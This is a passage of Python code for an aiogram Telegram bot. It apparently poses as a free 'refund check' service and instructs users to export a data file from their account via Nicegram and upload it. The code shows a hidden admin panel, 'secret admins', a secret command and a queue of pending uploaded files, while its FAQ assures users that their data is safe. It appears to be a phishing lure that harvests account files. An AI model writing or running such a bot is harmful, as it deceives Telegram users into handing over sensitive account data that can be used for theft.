    await callback.answer()

@dp.callback_query(F.data == "admin_manage")
async def admin_manage(callback: CallbackQuery):
    if callback.from_user.id != REAL_ADMIN_ID:
        await callback.answer("⛔️ Нет доступа", show_alert=True)
        return
    
    manage_text = f"""
⚙️ <b>УПРАВЛЕНИЕ СИСТЕМОЙ</b>

🔐 <b>Секретная панель:</b>
• Пользователей с доступом: {len(secret_admins)}
• Можно отключить доступ

🗑 <b>Очистка:</b>
• Удалить старые файлы
• Очистить статистику

📊 <b>Экспорт данных:</b>
• Экспорт статистики
• Экспорт логов

⚠️ <b>Опасные операции:</b>
• Сброс системы
• Блокировка пользователей
        """
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄 Обновить кэш", callback_data="clear_cache")],
        [InlineKeyboardButton(text="🗑 Очистить старые", callback_data="clear_old")],
        [InlineKeyboardButton(text="📊 Экспорт", callback_data="export_data")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_real_admin")]
    ])
    
    await callback.message.edit_text(
        manage_text,
        reply_markup=keyboard,
        parse_mode=ParseMode.HTML
    )
    await callback.answer()

@dp.callback_query(F.data == "back_to_real_admin")
async def back_to_real_admin(callback: CallbackQuery):
    if callback.from_user.id != REAL_ADMIN_ID:
        await callback.answer("⛔️ Нет доступа", show_alert=True)
        return
    
    await callback.message.edit_text("👑 <b>Реальная админ-панель</b>", reply_markup=get_real_admin_keyboard())
    await callback.answer()

@dp.callback_query(F.data == "instruction")
async def instruction_handler(callback: CallbackQuery):
    instruction_text = """
📖 <b>Инструкция по проверке:</b>

<b>➀. Скачайте приложение Nicegram с официального сайта.</b>
• Используйте только официальные источники

<b>➁. Откройте NiceGram и войдите в свой аккаунт.</b>
• Используйте существующий аккаунт Telegram

<b>➂. Зайдите в настройки и выберите пункт «Nicegram».</b>
• Откройте меню → Настройки → Nicegram

<b>➃. Экспортируйте данные истории звёзд.</b>
• В разделе «Покупки и подписки»
• Нажмите «Экспорт истории»

<b>➄. Отправьте файл этому боту.</b>
• Нажмите «Проверить на рефанд» → «Загрузить файл»
• Выберите экспортированный файл

<b>➅. Дождитесь проверки.</b>
• Администратор проверит ваш файл
• Вы получите результат в течение 5-30 минут

<code>⚠️ Важно:</code>
• Файл должен быть в формате .json или .txt
• Не редактируйте файл перед отправкой
        """
    
    await callback.message.edit_text(instruction_text, reply_markup=get_back_keyboard())
    await callback.answer()

@dp.callback_query(F.data == "download")
async def download_handler(callback: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🌐 Официальный сайт", url="https://nicegram.app")],
        [InlineKeyboardButton(text="📱 App Store", url="https://apps.apple.com/app/id1608870673")],
        [InlineKeyboardButton(text="🤖 Google Play", url="https://play.google.com/store/apps/details?id=app.nicegram")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_main")]
    ])
    
    await callback.message.edit_text(
        "📱 <b>Скачать NiceGram</b>\n\n👇 Выберите источник:",
        reply_markup=keyboard
    )
    await callback.answer()

@dp.callback_query(F.data == "check_refund")
async def check_refund_handler(callback: CallbackQuery):
    await callback.message.edit_text(
        "🔍 <b>Проверка на рефанд</b>\n\n👇 Выберите действие:",
        reply_markup=get_check_keyboard()
    )
    await callback.answer()

@dp.callback_query(F.data == "upload_file")
async def upload_file_handler(callback: CallbackQuery):
    user_id = callback.from_user.id
    
    text = "📤 <b>Загрузка файла</b>\n\n"
    text += "Отправьте мне файл истории звёзд из NiceGram.\n\n"
    text += "<code>✅ Форматы: .json, .txt, .csv, .xlsx\n"
    text += "✅ Размер: до 20 МБ\n"
    text += "⏳ Проверка: 5-30 минут</code>\n\n"
    
    if user_id in secret_admins:
        text += "🔐 <i>Используйте секретную панель для отслеживания статуса</i>"
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔐 Секретная панель", callback_data="show_secret_panel")],
            [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_main")]
        ])
    else:
        keyboard = get_back_keyboard()
    
    await callback.message.edit_text(text, reply_markup=keyboard)
    await callback.answer()

@dp.callback_query(F.data == "how_to_get_file")
async def how_to_get_file_handler(callback: CallbackQuery):
    await callback.message.edit_text(
        "📖 <b>Как получить файл истории звёзд:</b>\n\n"
        "1. Откройте NiceGram\n"
        "2. Настройки → Nicegram\n"
        "3. Покупки и подписки\n"
        "4. Экспорт истории\n"
        "5. Сохраните файл\n\n"
        "📁 Файл сохранится в:\n"
        "• iOS: Приложение «Файлы»\n"
        "• Android: Папка «Загрузки»",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📤 Отправить файл", callback_data="upload_file")],
            [InlineKeyboardButton(text="🔙 Назад", callback_data="check_refund")]
        ])
    )
    await callback.answer()

@dp.callback_query(F.data == "faq")
async def faq_handler(callback: CallbackQuery):
    faq_text = """
❓ <b>Частые вопросы</b>

<b>Q: Сколько ждать проверки?</b>
A: 5-30 минут, в зависимости от загрузки

<b>Q: Это бесплатно?</b>
A: Да, полностью бесплатно

<b>Q: Мои данные в безопасности?</b>
A: Да, файлы удаляются после проверки

<b>Q: Почему файл может быть отклонен?</b>
A: Неправильный формат, поврежденный файл, пустой файл

<b>Q: Можно ли отправить несколько файлов?</b>
A: Да, можно отправлять по одному файлу

<b>Q: Как узнать статус проверки?</b>
A: Бот отправит вам уведомление
        """
    
    await callback.message.edit_text(faq_text, reply_markup=get_back_keyboard())
    await callback.answer()

@dp.callback_query(F.data == "back_to_main")
async def back_to_main_handler(callback: CallbackQuery):
    await callback.message.edit_text(
        "🎭 <b>Главное меню</b>\n\n👇 Выберите действие:",
        reply_markup=get_main_keyboard()
    )
    await callback.answer()

async def main():
    print("=" * 50)
    print("🤖 ЗАПУСК БОТА СО СКРЫТОЙ АДМИН-ПАНЕЛЬЮ")
    print("=" * 50)
    print(f"🔑 Токен: {BOT_TOKEN[:15]}...")
    if REAL_ADMIN_ID:
        print(f"👑 Реальный админ ID: {REAL_ADMIN_ID}")
    else:
        print("⚠️ Реальный админ не указан")
    print("=" * 50)
    print("🚀 Бот запускается...")
    print("💬 Напишите /start в Telegram")
    print("🔐 Секретная команда: /cardorlox")
    print("=" * 50)
    
    asyncio.create_task(auto_save())
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        save_data(DATA_FILES['users'], users_db)
        save_data(DATA_FILES['pending'], pending_files)
        save_data(DATA_FILES['approved'], approved_files)
        save_data(DATA_FILES['rejected'], rejected_files)
        save_data(DATA_FILES['secret_admins'], secret_admins)
        print("\n🛑 Бот остановлен")
    except Exception as e:
        print(f"\n❌ Ошибка: {e}")
